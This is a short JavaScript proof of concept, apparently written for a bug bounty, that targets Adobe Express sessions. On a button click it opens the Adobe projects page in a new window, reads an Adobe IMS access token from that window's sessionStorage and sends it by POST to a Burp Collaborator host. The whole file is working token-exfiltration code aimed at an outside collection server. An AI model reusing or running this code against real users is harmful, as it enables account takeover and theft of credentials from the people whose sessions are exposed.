document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('button').addEventListener('click', () => {
        let openedWindow = window.open('https://express.adobe.com/sp/projects', 'newWindow');
        setTimeout(() => {
            fetch('https://ap3uw7o7w6y9ju104k7ul2c03r9ixgl5.burpcollaborator.net', { method: 'POST', body: openedWindow.sessionStorage.getItem('adobeid_ims_access_token/MarvelWeb3/false/AdobeID,DCAPI,ab.manage,additional_info.creation_source,additional_info.incomplete,additional_info.projectedProductContext,creative_cloud,creative_sdk,gnav,mps,openid,read_organizations,stk.a.k12_access.cru,stk.a.limited_license.cru,tk_platform,tk_platform_refresh_user,tk_platform_sync') });
        }, 4000);
    });
});